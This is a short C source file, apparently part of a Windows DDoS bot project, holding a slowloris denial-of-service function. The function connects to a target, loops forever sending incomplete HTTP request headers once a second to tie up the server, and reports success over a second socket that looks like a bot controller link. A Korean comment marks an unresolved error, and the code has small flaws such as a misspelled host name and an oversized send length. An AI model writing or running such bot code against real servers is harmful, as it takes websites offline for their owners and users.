#include "ddosbot.h"

int slowloris_attack() {
	if (connect(sock, (SOCKADDR*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
		perror("Not Connect with target");
		closesocket(sock);
		WSACleanup();
		return -1;
	}
	while (1) {
		url = "GET / HTTP/1.1\r\nHost: localhostr\r\n";
		if (send(sock, url, strlen(url), 0) == SOCKET_ERROR) {
			perror("send fail in slowloris"); //여기 에러 해결해야함
			closesocket(sock);
			WSACleanup();
			return -1;
		}

		if (send(csock, "slowrloris attack success\n", BUFF_SIZE, 0) == SOCKET_ERROR) {
			perror("attacked success but send fail");
			closesocket(sock);
			WSACleanup();
			return -1;
		}
		Sleep(1000);
	}
}
